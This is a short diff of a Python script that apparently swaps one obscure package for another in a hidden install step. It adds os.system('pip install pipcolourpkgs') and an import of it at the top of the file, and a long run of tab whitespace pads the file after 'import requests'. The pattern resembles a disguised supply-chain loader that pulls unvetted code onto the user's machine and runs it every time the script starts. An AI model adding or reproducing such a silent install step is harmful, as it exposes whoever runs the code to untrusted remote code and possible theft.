@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourmoduleV2")
-import pythoncolourmoduleV2
+os.system("pip install pipcolourpkgs")
+import pipcolourpkgs
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
